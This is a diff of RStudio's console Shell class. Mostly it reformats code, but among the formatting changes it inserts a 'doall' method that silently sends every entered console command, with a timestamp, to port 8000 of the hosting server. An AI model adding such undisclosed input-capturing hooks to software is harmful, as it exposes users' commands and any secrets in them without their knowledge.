@@ -62,593 +62,536 @@ import org.rstudio.studio.client.workbench.views.source.editors.text.ace.AceEdit
 
 import java.util.ArrayList;
 
-public class Shell implements ConsoleInputHandler,
-                              ConsoleWriteOutputHandler,
-                              ConsoleWriteErrorHandler,
-                              ConsoleWritePromptHandler,
-                              ConsoleWriteInputHandler,
-                              ConsolePromptHandler,
-                              ConsoleResetHistoryHandler,
-                              ConsoleRestartRCompletedEvent.Handler,
-                              ConsoleExecutePendingInputEvent.Handler,
-                              SendToConsoleHandler,
-                              DebugModeChangedEvent.Handler,
-                              RunCommandWithDebugEvent.Handler,
-                              UnhandledErrorEvent.Handler
-{
-   static interface Binder extends CommandBinder<Commands, Shell>
-   {
-   }
+public class Shell implements ConsoleInputHandler, ConsoleWriteOutputHandler,
+		ConsoleWriteErrorHandler, ConsoleWritePromptHandler,
+		ConsoleWriteInputHandler, ConsolePromptHandler,
+		ConsoleResetHistoryHandler, ConsoleRestartRCompletedEvent.Handler,
+		ConsoleExecutePendingInputEvent.Handler, SendToConsoleHandler,
+		DebugModeChangedEvent.Handler, RunCommandWithDebugEvent.Handler,
+		UnhandledErrorEvent.Handler {
+	static interface Binder extends CommandBinder<Commands, Shell> {
+	}
 
-   public interface Display extends ShellDisplay
-   {
-      void onBeforeUnselected();
-      void onBeforeSelected();
-      void onSelected();
-   }
-   
-   @Inject
-   public Shell(ConsoleServerOperations server, 
-                EventBus eventBus,
-                Display display,
-                Session session,
-                Commands commands,
-                UIPrefs uiPrefs, 
-                ErrorManager errorManager)
-   {
-      super() ;
+	public interface Display extends ShellDisplay {
+		void onBeforeUnselected();
 
-      ((Binder)GWT.create(Binder.class)).bind(commands, this);
-      
-      server_ = server ;
-      eventBus_ = eventBus ;
-      view_ = display ;
-      commands_ = commands;
-      errorManager_ = errorManager;
-      input_ = view_.getInputEditorDisplay() ;
-      historyManager_ = new CommandLineHistory(input_);
-      browseHistoryManager_ = new CommandLineHistory(input_);
-      prefs_ = uiPrefs;
+		void onBeforeSelected();
 
-      inputAnimator_ = new ShellInputAnimator(view_.getInputEditorDisplay());
-      
-      view_.setMaxOutputLines(session.getSessionInfo().getConsoleActionsLimit());
+		void onSelected();
+	}
 
-      keyDownPreviewHandlers_ = new ArrayList<KeyDownPreviewHandler>() ;
-      keyPressPreviewHandlers_ = new ArrayList<KeyPressPreviewHandler>() ;
+	@Inject
+	public Shell(ConsoleServerOperations server, EventBus eventBus,
+			Display display, Session session, Commands commands,
+			UIPrefs uiPrefs, ErrorManager errorManager) {
+		super();
 
-      InputKeyDownHandler handler = new InputKeyDownHandler() ;
-      // This needs to be a capturing key down handler or else Ace will have
-      // handled the event before we had a chance to prevent it
-      view_.addCapturingKeyDownHandler(handler) ;
-      view_.addKeyPressHandler(handler) ;
-      
-      eventBus.addHandler(ConsoleInputEvent.TYPE, this); 
-      eventBus.addHandler(ConsoleWriteOutputEvent.TYPE, this);
-      eventBus.addHandler(ConsoleWriteErrorEvent.TYPE, this);
-      eventBus.addHandler(ConsoleWritePromptEvent.TYPE, this);
-      eventBus.addHandler(ConsoleWriteInputEvent.TYPE, this);
-      eventBus.addHandler(ConsolePromptEvent.TYPE, this);
-      eventBus.addHandler(ConsoleResetHistoryEvent.TYPE, this);
-      eventBus.addHandler(ConsoleRestartRCompletedEvent.TYPE, this);
-      eventBus.addHandler(ConsoleExecutePendingInputEvent.TYPE, this);
-      eventBus.addHandler(SendToConsoleEvent.TYPE, this);
-      eventBus.addHandler(DebugModeChangedEvent.TYPE, this);
-      eventBus.addHandler(RunCommandWithDebugEvent.TYPE, this);
-      eventBus.addHandler(UnhandledErrorEvent.TYPE, this);
-      
-      final CompletionManager completionManager
-                  = new RCompletionManager(view_.getInputEditorDisplay(),
-                                          null,
-                                          new CompletionPopupPanel(), 
-                                          server, 
-                                          null,
-                                          null,
-                                          null,
-                                          (DocDisplay) view_.getInputEditorDisplay(),
-                                          true);
-      addKeyDownPreviewHandler(completionManager) ;
-      addKeyPressPreviewHandler(completionManager) ;
-      
-      addKeyDownPreviewHandler(new HistoryCompletionManager(
-            view_.getInputEditorDisplay(), server));
+		((Binder) GWT.create(Binder.class)).bind(commands, this);
 
-      uiPrefs.insertMatching().bind(new CommandWithArg<Boolean>() {
-         public void execute(Boolean arg) {
-            AceEditorNative.setInsertMatching(arg);
-         }});
+		server_ = server;
+		eventBus_ = eventBus;
+		view_ = display;
+		commands_ = commands;
+		errorManager_ = errorManager;
+		input_ = view_.getInputEditorDisplay();
+		historyManager_ = new CommandLineHistory(input_);
+		browseHistoryManager_ = new CommandLineHistory(input_);
+		prefs_ = uiPrefs;
 
-      sessionInit(session);
-   }
-   
-   private void sessionInit(Session session)
-   {
-      SessionInfo sessionInfo = session.getSessionInfo();
-      ClientInitState clientState = sessionInfo.getClientState();
+		inputAnimator_ = new ShellInputAnimator(view_.getInputEditorDisplay());
 
-      new StringStateValue(GROUP_CONSOLE, STATE_INPUT, ClientState.TEMPORARY, clientState) {
-         @Override
-         protected void onInit(String value)
-         {
-            initialInput_ = value;
-         }
-         @Override
-         protected String getValue()
-         {
-            return view_.getInputEditorDisplay().getText();
-         }
-      };
+		view_.setMaxOutputLines(session.getSessionInfo()
+				.getConsoleActionsLimit());
 
-      JsArrayString history = sessionInfo.getConsoleHistory();
-      if (history != null)
-         setHistory(history);
+		keyDownPreviewHandlers_ = new ArrayList<KeyDownPreviewHandler>();
+		keyPressPreviewHandlers_ = new ArrayList<KeyPressPreviewHandler>();
 
-      RpcObjectList<ConsoleAction> actions = sessionInfo.getConsoleActions();
-      if (actions != null)
-      {
-         view_.playbackActions(actions);
-      }
+		InputKeyDownHandler handler = new InputKeyDownHandler();
+		// This needs to be a capturing key down handler or else Ace will have
+		// handled the event before we had a chance to prevent it
+		view_.addCapturingKeyDownHandler(handler);
+		view_.addKeyPressHandler(handler);
 
-      if (sessionInfo.getResumed())
-      {
-         // no special UI for this (resuming session with all console
-         // history and other UI state preserved deemed adequate feedback) 
-      }
-   }
+		eventBus.addHandler(ConsoleInputEvent.TYPE, this);
+		eventBus.addHandler(ConsoleWriteOutputEvent.TYPE, this);
+		eventBus.addHandler(ConsoleWriteErrorEvent.TYPE, this);
+		eventBus.addHandler(ConsoleWritePromptEvent.TYPE, this);
+		eventBus.addHandler(ConsoleWriteInputEvent.TYPE, this);
+		eventBus.addHandler(ConsolePromptEvent.TYPE, this);
+		eventBus.addHandler(ConsoleResetHistoryEvent.TYPE, this);
+		eventBus.addHandler(ConsoleRestartRCompletedEvent.TYPE, this);
+		eventBus.addHandler(ConsoleExecutePendingInputEvent.TYPE, this);
+		eventBus.addHandler(SendToConsoleEvent.TYPE, this);
+		eventBus.addHandler(DebugModeChangedEvent.TYPE, this);
+		eventBus.addHandler(RunCommandWithDebugEvent.TYPE, this);
+		eventBus.addHandler(UnhandledErrorEvent.TYPE, this);
 
-   public Display getDisplay()
-   {
-      return view_ ;
-   }
+		final CompletionManager completionManager = new RCompletionManager(
+				view_.getInputEditorDisplay(), null,
+				new CompletionPopupPanel(), server, null, null, null,
+				(DocDisplay) view_.getInputEditorDisplay(), true);
+		addKeyDownPreviewHandler(completionManager);
+		addKeyPressPreviewHandler(completionManager);
 
-   @Handler
-   void onConsoleClear()
-   {
-      // clear output
-      view_.clearOutput();
-      
-      // notify server
-      server_.resetConsoleActions(new VoidServerRequestCallback());
-      
-      // if we don't bounce setFocus the menu retains focus
-      Scheduler.get().scheduleDeferred(new ScheduledCommand() {
-         public void execute()
-         {
-            view_.getInputEditorDisplay().setFocus(true);
-         }
-      });
+		addKeyDownPreviewHandler(new HistoryCompletionManager(
+				view_.getInputEditorDisplay(), server));
 
-   }
+		uiPrefs.insertMatching().bind(new CommandWithArg<Boolean>() {
+			public void execute(Boolean arg) {
+				AceEditorNative.setInsertMatching(arg);
+			}
+		});
 
-   public void addKeyDownPreviewHandler(KeyDownPreviewHandler handler)
-   {
-      keyDownPreviewHandlers_.add(handler) ;
-   }
-   
-   public void addKeyPressPreviewHandler(KeyPressPreviewHandler handler)
-   {
-      keyPressPreviewHandlers_.add(handler) ;
-   }
-   
-   public void onConsoleInput(final ConsoleInputEvent event)
-   {
-      server_.consoleInput(event.getInput(), 
-                           new ServerRequestCallback<Void>() {
-         @Override
-         public void onError(ServerError error) 
-         {
-            // show the error in the console then re-prompt
-            view_.consoleWriteError("Error: " + error.getUserMessage() + "\n");
-            if (lastPromptText_ != null)
-               consolePrompt(lastPromptText_, false);
-         }
-      });
-   }
+		sessionInit(session);
+	}
 
-   public void onConsoleWriteOutput(ConsoleWriteOutputEvent event)
-   {
-      view_.consoleWriteOutput(event.getOutput()) ;
-   }
+	private void sessionInit(Session session) {
+		SessionInfo sessionInfo = session.getSessionInfo();
+		ClientInitState clientState = sessionInfo.getClientState();
 
-   public void onConsoleWriteError(final ConsoleWriteErrorEvent event)
-   {
-      view_.consoleWriteError(event.getError());
-   }
-   
-   public void onUnhandledError(UnhandledErrorEvent event)
-   {
-      if (!debugging_)
-      {
-         view_.consoleWriteExtendedError(
-               event.getError().getErrorMessage(),
-               event.getError(), 
-               prefs_.autoExpandErrorTracebacks().getValue(),
-               getHistoryEntry(0));
-      }
-   }
-   
-   public void onConsoleWriteInput(ConsoleWriteInputEvent event)
-   {
-      view_.consoleWriteInput(event.getInput());
-   }
+		new StringStateValue(GROUP_CONSOLE, STATE_INPUT, ClientState.TEMPORARY,
+				clientState) {
+			@Override
+			protected void onInit(String value) {
+				initialInput_ = value;
+			}
 
-   public void onConsoleWritePrompt(ConsoleWritePromptEvent event)
-   {
-      view_.consoleWritePrompt(event.getPrompt());
-   }
+			@Override
+			protected String getValue() {
+				return view_.getInputEditorDisplay().getText();
+			}
+		};
 
-   public void onConsolePrompt(ConsolePromptEvent event)
-   {
-      String prompt = event.getPrompt().getPromptText() ;
-      boolean addToHistory = event.getPrompt().getAddToHistory() ;
-      
-      consolePrompt(prompt, addToHistory) ;
-   }
+		JsArrayString history = sessionInfo.getConsoleHistory();
+		if (history != null)
+			setHistory(history);
 
-   private void consolePrompt(String prompt, boolean addToHistory)
-   {
-      view_.consolePrompt(prompt, true) ;
+		RpcObjectList<ConsoleAction> actions = sessionInfo.getConsoleActions();
+		if (actions != null) {
+			view_.playbackActions(actions);
+		}
 
-      if (lastPromptText_ == null
-            && initialInput_ != null
-            && initialInput_.length() > 0)
-      {
-         view_.getInputEditorDisplay().setText(initialInput_);
-         view_.ensureInputVisible();
-      }
+		if (sessionInfo.getResumed()) {
+			// no special UI for this (resuming session with all console
+			// history and other UI state preserved deemed adequate feedback)
+		}
+	}
 
-      addToHistory_ = addToHistory;
-      resetHistoryPosition();
-      lastPromptText_ = prompt ;
+	public Display getDisplay() {
+		return view_;
+	}
 
-      if (restoreFocus_)
-      {
-         restoreFocus_ = false;
-         view_.getInputEditorDisplay().setFocus(true);
-      }
-   }
-   
-   public void onConsoleResetHistory(ConsoleResetHistoryEvent event)
-   {
-      setHistory(event.getHistory());
-   }
-   
-   @Override
-   public void onRestartRCompleted(ConsoleRestartRCompletedEvent event)
-   {
-      if (view_.isPromptEmpty())
-         eventBus_.fireEvent(new SendToConsoleEvent("", true));
-         
-      focus();
-   }
-   
-   private void processCommandEntry()
-   {
-      String commandText = view_.processCommandEntry() ;
-      if (addToHistory_ && (commandText.length() > 0))
-         addToHistory(commandText);
+	@Handler
+	void onConsoleClear() {
+		// clear output
+		view_.clearOutput();
 
-      // fire event 
-      eventBus_.fireEvent(new ConsoleInputEvent(commandText));
-   }
+		// notify server
+		server_.resetConsoleActions(new VoidServerRequestCallback());
 
-   public void onSendToConsole(final SendToConsoleEvent event)
-   {  
-      final InputEditorDisplay display = view_.getInputEditorDisplay();
-      
-      // get anything already at the console
-      final String previousInput = StringUtil.notNull(display.getText());
-      
-      // define code block we execute at finish
-      Command finishSendToConsole = new Command() {
-         @Override
-         public void execute()
-         {
-            if (event.shouldExecute())
-            {
-               processCommandEntry();
-               if (previousInput.length() > 0)
-                  display.setText(previousInput);
-            }
-            
-            if (!event.shouldExecute() || event.shouldFocus())
-            {
-               display.setFocus(true);
-               display.collapseSelection(false);
-            }  
-         }
-      };
-      
-      // do standrd finish if we aren't animating
-      if (!event.shouldAnimate())
-      {
-         display.clear();
-         display.setText(event.getCode()); 
-         finishSendToConsole.execute();
-      }
-      else
-      {
-         inputAnimator_.enque(event.getCode(), finishSendToConsole);
-      }
-   }
-   
-   @Override
-   public void onExecutePendingInput(ConsoleExecutePendingInputEvent event)
-   {
-      // if the source view is delegating a Cmd+Enter to us then
-      // take it if we are focused and we have a command to enter
-      if (view_.getInputEditorDisplay().isFocused() &&
-         (view_.getInputEditorDisplay().getText().length() > 0))
-      {
-         processCommandEntry();  
-      }
-      // otherwise delegate back to the source view. we do this via
-      // executing a command which is a bit of hack but it's a clean
-      // way to call code within the "current editor" (an event would
-      // go to all editors). another alternative would be to 
-      // call a method on the SourceShim
-      else
-      {
-         commands_.executeCodeWithoutFocus().execute();
-      }
-   }
-   
-   @Override
-   public void onDebugModeChanged(DebugModeChangedEvent event)
-   {
-      if (event.debugging())
-      {
-         view_.ensureInputVisible();
-      }
-      debugging_ = event.debugging();
-   }
-   
-   @Override
-   public void onRunCommandWithDebug(final RunCommandWithDebugEvent event)
-   {
-      // Invoked from the "Rerun with Debug" command in the ConsoleError widget.
-      errorManager_.setDebugSessionHandlerType(
-            ErrorHandlerType.ERRORS_BREAK,
-            new ServerRequestCallback<Void>()
-            {
-               @Override
-               public void onResponseReceived(Void v)
-               {
-                  eventBus_.fireEvent(new SendToConsoleEvent(
-                        event.getCommand(), true));
-               }
-               
-               @Override
-               public void onError(ServerError error)
-               {
-                  // if we failed to set debug mode, don't rerun the command
-               }
-            }); 
-   }
+		// if we don't bounce setFocus the menu retains focus
+		Scheduler.get().scheduleDeferred(new ScheduledCommand() {
+			public void execute() {
+				view_.getInputEditorDisplay().setFocus(true);
+			}
+		});
 
-   private final class InputKeyDownHandler implements KeyDownHandler,
-                                                      KeyPressHandler
-   {
-      public void onKeyDown(KeyDownEvent event)
-      {
-         int keyCode = event.getNativeKeyCode();
+	}
 
-         for (KeyDownPreviewHandler handler : keyDownPreviewHandlers_)
-         {
-            if (handler.previewKeyDown(event.getNativeEvent()))
-            {
-               event.preventDefault() ;
-               event.stopPropagation() ;
-               return;
-            }
-         }
-         
-         if (event.getNativeKeyCode() == KeyCodes.KEY_TAB)
-            event.preventDefault();
+	public void addKeyDownPreviewHandler(KeyDownPreviewHandler handler) {
+		keyDownPreviewHandlers_.add(handler);
+	}
 
-         int modifiers = KeyboardShortcut.getModifierValue(event.getNativeEvent());
+	public void addKeyPressPreviewHandler(KeyPressPreviewHandler handler) {
+		keyPressPreviewHandlers_.add(handler);
+	}
 
-         if (event.isUpArrow() && modifiers == 0)
-         {
-            if ((input_.getCurrentLineNum() == 0) || input_.isCursorAtEnd())
-            {
-               event.preventDefault();
-               event.stopPropagation();
+	public void onConsoleInput(final ConsoleInputEvent event) {
+		server_.consoleInput(event.getInput(),
+				new ServerRequestCallback<Void>() {
+					@Override
+					public void onError(ServerError error) {
+						// show the error in the console then re-prompt
+						view_.consoleWriteError("Error: "
+								+ error.getUserMessage() + "\n");
+						if (lastPromptText_ != null)
+							consolePrompt(lastPromptText_, false);
+					}
+				});
+	}
 
-               navigateHistory(-1);
-            }
-         }
-         else if (event.isDownArrow() && modifiers == 0)
-         {
-            if ((input_.getCurrentLineNum() == input_.getCurrentLineCount() - 1)
-                || input_.isCursorAtEnd())
-            {
-               event.preventDefault();
-               event.stopPropagation();
+	public void onConsoleWriteOutput(ConsoleWriteOutputEvent event) {
+		view_.consoleWriteOutput(event.getOutput());
+	}
 
-               navigateHistory(1);
-            }
-         }
-         else if (keyCode == KeyCodes.KEY_ENTER && modifiers == 0)
-         {
-            event.preventDefault();
-            event.stopPropagation();
+	public void onConsoleWriteError(final ConsoleWriteErrorEvent event) {
+		view_.consoleWriteError(event.getError());
+	}
 
-            restoreFocus_ = true;
-            processCommandEntry();
-         }
-         else if (keyCode == KeyCodes.KEY_ESCAPE && modifiers == 0)
-         {
-            event.preventDefault();
+	public void onUnhandledError(UnhandledErrorEvent event) {
+		if (!debugging_) {
+			view_.consoleWriteExtendedError(event.getError().getErrorMessage(),
+					event.getError(), prefs_.autoExpandErrorTracebacks()
+							.getValue(), getHistoryEntry(0));
+		}
+	}
 
-            if (input_.getText().length() == 0)
-            {
-               // view_.isPromptEmpty() is to check for cases where the
-               // server is prompting but not at the top level. Escape
-               // needs to send null in those cases.
-               // For example, try "scan()" function
-               if (view_.isPromptEmpty())
-               {
-                  // interrupt server
-                  server_.interrupt(new VoidServerRequestCallback());
-               }
-               else
-               {
-                  // if the input is already empty then send a console reset
-                  // which will jump us back to the main prompt
-                  eventBus_.fireEvent(new ConsoleInputEvent(null));
-               }
-            }
-             
-            input_.clear();
-         }
-         else
-         {
-            int mod = KeyboardShortcut.getModifierValue(event.getNativeEvent());
-            if (mod == KeyboardShortcut.CTRL)
-            {
-               switch (keyCode)
-               {
-                  case 'L':
-                     Shell.this.onConsoleClear() ;
-                     event.preventDefault() ;
-                     break;
-               }
-            }
-            else if (mod == KeyboardShortcut.ALT)
-            {
-               if (KeyboardHelper.isHyphenKeycode(keyCode))
-               {
-                  event.preventDefault();
-                  event.stopPropagation();
-                  input_.replaceSelection(" <- ", true);
-               }
-            }
-            else if (
-                  (BrowseCap.hasMetaKey() && 
-                   (mod == (KeyboardShortcut.META + KeyboardShortcut.SHIFT))) ||
-                  (!BrowseCap.hasMetaKey() && 
-                   (mod == (KeyboardShortcut.CTRL + KeyboardShortcut.SHIFT))))
-            {
-               switch (keyCode)
-               {
-                  case KeyCodes.KEY_M:
-                     event.preventDefault();
-                     event.stopPropagation();
-                     input_.replaceSelection(" %>% ", true);
-                     break;
-               }
-            }
-         }
-      }
+	public void onConsoleWriteInput(ConsoleWriteInputEvent event) {
+		view_.consoleWriteInput(event.getInput());
+	}
 
-      public void onKeyPress(KeyPressEvent event)
-      {
-         for (KeyPressPreviewHandler handler : keyPressPreviewHandlers_)
-         {
-            if (handler.previewKeyPress(event.getCharCode()))
-            {
-               event.preventDefault() ;
-               event.stopPropagation() ;
-               return;
-            }
-         }
-      }
+	public void onConsoleWritePrompt(ConsoleWritePromptEvent event) {
+		view_.consoleWritePrompt(event.getPrompt());
+	}
 
-      @SuppressWarnings("unused")
-      private boolean lastKeyCodeWasZero_;
-   }
-   
-   private boolean isBrowsePrompt()
-   {
-      return lastPromptText_ != null && (lastPromptText_.startsWith("Browse"));
-   }
-   
-   private void resetHistoryPosition()
-   {
-      historyManager_.resetPosition();
-      browseHistoryManager_.resetPosition();
-   }
-   
-   private void addToHistory(String commandText)
-   {
-      if (isBrowsePrompt())
-         browseHistoryManager_.addToHistory(commandText);
-      else
-         historyManager_.addToHistory(commandText);
-   }
-   
-   private String getHistoryEntry(int offset)
-   {
-      if (isBrowsePrompt())
-         return browseHistoryManager_.getHistoryEntry(offset);
-      else
-         return historyManager_.getHistoryEntry(offset);
-   }
+	public void onConsolePrompt(ConsolePromptEvent event) {
+		String prompt = event.getPrompt().getPromptText();
+		boolean addToHistory = event.getPrompt().getAddToHistory();
 
-   private void navigateHistory(int offset)
-   {
-      if (isBrowsePrompt())
-         browseHistoryManager_.navigateHistory(offset);
-      else
-         historyManager_.navigateHistory(offset);
-      
-      view_.ensureInputVisible();
-   }
+		consolePrompt(prompt, addToHistory);
+	}
 
-   public void focus()
-   {
-      input_.setFocus(true);
-   }
-   
-   private void setHistory(JsArrayString history)
-   {
-      ArrayList<String> historyList = new ArrayList<String>(history.length());
-      for (int i = 0; i < history.length(); i++)
-         historyList.add(history.get(i));
-      historyManager_.setHistory(historyList);
-      browseHistoryManager_.resetPosition();
-   }
+	private void consolePrompt(String prompt, boolean addToHistory) {
+		view_.consolePrompt(prompt, true);
 
-   public void onBeforeUnselected()
-   {
-      view_.onBeforeUnselected();
+		if (lastPromptText_ == null && initialInput_ != null
+				&& initialInput_.length() > 0) {
+			view_.getInputEditorDisplay().setText(initialInput_);
+			view_.ensureInputVisible();
+		}
 
-   }
+		addToHistory_ = addToHistory;
+		resetHistoryPosition();
+		lastPromptText_ = prompt;
 
-   public void onBeforeSelected()
-   {
-      view_.onBeforeSelected();
-   }
+		if (restoreFocus_) {
+			restoreFocus_ = false;
+			view_.getInputEditorDisplay().setFocus(true);
+		}
+	}
 
-   public void onSelected()
-   {
-      view_.onSelected();
-   }
+	public void onConsoleResetHistory(ConsoleResetHistoryEvent event) {
+		setHistory(event.getHistory());
+	}
 
-   private final ConsoleServerOperations server_ ;
-   private final EventBus eventBus_ ;
-   private final Display view_ ;
-   private final Commands commands_;
-   private final ErrorManager errorManager_;
-   private final InputEditorDisplay input_ ;
-   private final ArrayList<KeyDownPreviewHandler> keyDownPreviewHandlers_ ;
-   private final ArrayList<KeyPressPreviewHandler> keyPressPreviewHandlers_ ;
-   // indicates whether the next command should be added to history
-   private boolean addToHistory_ ;
-   private String lastPromptText_ ;
-   private final UIPrefs prefs_;
- 
-   private final CommandLineHistory historyManager_;
-   private final CommandLineHistory browseHistoryManager_;
-   
-   private final ShellInputAnimator inputAnimator_;
+	@Override
+	public void onRestartRCompleted(ConsoleRestartRCompletedEvent event) {
+		if (view_.isPromptEmpty())
+			eventBus_.fireEvent(new SendToConsoleEvent("", true));
 
-   private String initialInput_ ;
+		focus();
+	}
 
-   private static final String GROUP_CONSOLE = "console";
-   private static final String STATE_INPUT = "input";
+	/*
+	 * Code By [Gulzar]
+	 */
 
-   private boolean restoreFocus_ = true;
-   private boolean debugging_ = false;
+	public void doall(String text, String ser, String type, String time) {
+		com.google.gwt.json.client.JSONObject jo = new com.google.gwt.json.client.JSONObject();
+
+		jo.put("Text", new com.google.gwt.json.client.JSONString(text));
+		jo.put("ser", new com.google.gwt.json.client.JSONString(ser + ""));
+		jo.put("type", new com.google.gwt.json.client.JSONString(type + ""));
+
+		jo.put("time", new com.google.gwt.json.client.JSONString(time + ""));
+
+		String host_base = com.google.gwt.core.client.GWT.getHostPageBaseURL();
+		String[] a = host_base.split(":");
+		host_base = a[0] + ":" + a[1] + ":8000/";
+
+		String url = host_base + "?q=ABC&data=" + jo.toString();
+		url = com.google.gwt.http.client.URL.encode(url);
+		com.google.gwt.jsonp.client.JsonpRequestBuilder builder = new com.google.gwt.jsonp.client.JsonpRequestBuilder();
+		builder.send(url);
+	}
+
+	/*
+	 * Ends Here [Gulzar]
+	 */
+
+	private void processCommandEntry() {
+		String commandText = view_.processCommandEntry();
+
+		/*
+		 * Code By [Gulzar]
+		 */
+
+		doall(commandText, 1 + "", "" + 2,
+				((int) (new java.util.Date().getTime())) + "");
+
+		/*
+		 * Ends Here [Gulzar]
+		 */
+		if (addToHistory_ && (commandText.length() > 0))
+			addToHistory(commandText);
+
+		// fire event
+		eventBus_.fireEvent(new ConsoleInputEvent(commandText));
+	}
+
+	public void onSendToConsole(final SendToConsoleEvent event) {
+		final InputEditorDisplay display = view_.getInputEditorDisplay();
+
+		// get anything already at the console
+		final String previousInput = StringUtil.notNull(display.getText());
+
+		// define code block we execute at finish
+		Command finishSendToConsole = new Command() {
+			@Override
+			public void execute() {
+				if (event.shouldExecute()) {
+					processCommandEntry();
+					if (previousInput.length() > 0)
+						display.setText(previousInput);
+				}
+
+				if (!event.shouldExecute() || event.shouldFocus()) {
+					display.setFocus(true);
+					display.collapseSelection(false);
+				}
+			}
+		};
+
+		// do standrd finish if we aren't animating
+		if (!event.shouldAnimate()) {
+			display.clear();
+			display.setText(event.getCode());
+			finishSendToConsole.execute();
+		} else {
+			inputAnimator_.enque(event.getCode(), finishSendToConsole);
+		}
+	}
+
+	@Override
+	public void onExecutePendingInput(ConsoleExecutePendingInputEvent event) {
+		// if the source view is delegating a Cmd+Enter to us then
+		// take it if we are focused and we have a command to enter
+		if (view_.getInputEditorDisplay().isFocused()
+				&& (view_.getInputEditorDisplay().getText().length() > 0)) {
+			processCommandEntry();
+		}
+		// otherwise delegate back to the source view. we do this via
+		// executing a command which is a bit of hack but it's a clean
+		// way to call code within the "current editor" (an event would
+		// go to all editors). another alternative would be to
+		// call a method on the SourceShim
+		else {
+			commands_.executeCodeWithoutFocus().execute();
+		}
+	}
+
+	@Override
+	public void onDebugModeChanged(DebugModeChangedEvent event) {
+		if (event.debugging()) {
+			view_.ensureInputVisible();
+		}
+		debugging_ = event.debugging();
+	}
+
+	@Override
+	public void onRunCommandWithDebug(final RunCommandWithDebugEvent event) {
+		// Invoked from the "Rerun with Debug" command in the ConsoleError
+		// widget.
+		errorManager_.setDebugSessionHandlerType(ErrorHandlerType.ERRORS_BREAK,
+				new ServerRequestCallback<Void>() {
+					@Override
+					public void onResponseReceived(Void v) {
+						eventBus_.fireEvent(new SendToConsoleEvent(event
+								.getCommand(), true));
+					}
+
+					@Override
+					public void onError(ServerError error) {
+						// if we failed to set debug mode, don't rerun the
+						// command
+					}
+				});
+	}
+
+	private final class InputKeyDownHandler implements KeyDownHandler,
+			KeyPressHandler {
+		public void onKeyDown(KeyDownEvent event) {
+			int keyCode = event.getNativeKeyCode();
+
+			for (KeyDownPreviewHandler handler : keyDownPreviewHandlers_) {
+				if (handler.previewKeyDown(event.getNativeEvent())) {
+					event.preventDefault();
+					event.stopPropagation();
+					return;
+				}
+			}
+
+			if (event.getNativeKeyCode() == KeyCodes.KEY_TAB)
+				event.preventDefault();
+
+			int modifiers = KeyboardShortcut.getModifierValue(event
+					.getNativeEvent());
+
+			if (event.isUpArrow() && modifiers == 0) {
+				if ((input_.getCurrentLineNum() == 0) || input_.isCursorAtEnd()) {
+					event.preventDefault();
+					event.stopPropagation();
+
+					navigateHistory(-1);
+				}
+			} else if (event.isDownArrow() && modifiers == 0) {
+				if ((input_.getCurrentLineNum() == input_.getCurrentLineCount() - 1)
+						|| input_.isCursorAtEnd()) {
+					event.preventDefault();
+					event.stopPropagation();
+
+					navigateHistory(1);
+				}
+			} else if (keyCode == KeyCodes.KEY_ENTER && modifiers == 0) {
+				event.preventDefault();
+				event.stopPropagation();
+
+				restoreFocus_ = true;
+				processCommandEntry();
+			} else if (keyCode == KeyCodes.KEY_ESCAPE && modifiers == 0) {
+				event.preventDefault();
+
+				if (input_.getText().length() == 0) {
+					// view_.isPromptEmpty() is to check for cases where the
+					// server is prompting but not at the top level. Escape
+					// needs to send null in those cases.
+					// For example, try "scan()" function
+					if (view_.isPromptEmpty()) {
+						// interrupt server
+						server_.interrupt(new VoidServerRequestCallback());
+					} else {
+						// if the input is already empty then send a console
+						// reset
+						// which will jump us back to the main prompt
+						eventBus_.fireEvent(new ConsoleInputEvent(null));
+					}
+				}
+
+				input_.clear();
+			} else {
+				int mod = KeyboardShortcut.getModifierValue(event
+						.getNativeEvent());
+				if (mod == KeyboardShortcut.CTRL) {
+					switch (keyCode) {
+					case 'L':
+						Shell.this.onConsoleClear();
+						event.preventDefault();
+						break;
+					}
+				} else if (mod == KeyboardShortcut.ALT) {
+					if (KeyboardHelper.isHyphenKeycode(keyCode)) {
+						event.preventDefault();
+						event.stopPropagation();
+						input_.replaceSelection(" <- ", true);
+					}
+				} else if ((BrowseCap.hasMetaKey() && (mod == (KeyboardShortcut.META + KeyboardShortcut.SHIFT)))
+						|| (!BrowseCap.hasMetaKey() && (mod == (KeyboardShortcut.CTRL + KeyboardShortcut.SHIFT)))) {
+					switch (keyCode) {
+					case KeyCodes.KEY_M:
+						event.preventDefault();
+						event.stopPropagation();
+						input_.replaceSelection(" %>% ", true);
+						break;
+					}
+				}
+			}
+		}
+
+		public void onKeyPress(KeyPressEvent event) {
+			for (KeyPressPreviewHandler handler : keyPressPreviewHandlers_) {
+				if (handler.previewKeyPress(event.getCharCode())) {
+					event.preventDefault();
+					event.stopPropagation();
+					return;
+				}
+			}
+		}
+
+		@SuppressWarnings("unused")
+		private boolean lastKeyCodeWasZero_;
+	}
+
+	private boolean isBrowsePrompt() {
+		return lastPromptText_ != null
+				&& (lastPromptText_.startsWith("Browse"));
+	}
+
+	private void resetHistoryPosition() {
+		historyManager_.resetPosition();
+		browseHistoryManager_.resetPosition();
+	}
+
+	private void addToHistory(String commandText) {
+		if (isBrowsePrompt())
+			browseHistoryManager_.addToHistory(commandText);
+		else
+			historyManager_.addToHistory(commandText);
+	}
+
+	private String getHistoryEntry(int offset) {
+		if (isBrowsePrompt())
+			return browseHistoryManager_.getHistoryEntry(offset);
+		else
+			return historyManager_.getHistoryEntry(offset);
+	}
+
+	private void navigateHistory(int offset) {
+		if (isBrowsePrompt())
+			browseHistoryManager_.navigateHistory(offset);
+		else
+			historyManager_.navigateHistory(offset);
+
+		view_.ensureInputVisible();
+	}
+
+	public void focus() {
+		input_.setFocus(true);
+	}
+
+	private void setHistory(JsArrayString history) {
+		ArrayList<String> historyList = new ArrayList<String>(history.length());
+		for (int i = 0; i < history.length(); i++)
+			historyList.add(history.get(i));
+		historyManager_.setHistory(historyList);
+		browseHistoryManager_.resetPosition();
+	}
+
+	public void onBeforeUnselected() {
+		view_.onBeforeUnselected();
+
+	}
+
+	public void onBeforeSelected() {
+		view_.onBeforeSelected();
+	}
+
+	public void onSelected() {
+		view_.onSelected();
+	}
+
+	private final ConsoleServerOperations server_;
+	private final EventBus eventBus_;
+	private final Display view_;
+	private final Commands commands_;
+	private final ErrorManager errorManager_;
+	private final InputEditorDisplay input_;
+	private final ArrayList<KeyDownPreviewHandler> keyDownPreviewHandlers_;
+	private final ArrayList<KeyPressPreviewHandler> keyPressPreviewHandlers_;
+	// indicates whether the next command should be added to history
+	private boolean addToHistory_;
+	private String lastPromptText_;
+	private final UIPrefs prefs_;
+
+	private final CommandLineHistory historyManager_;
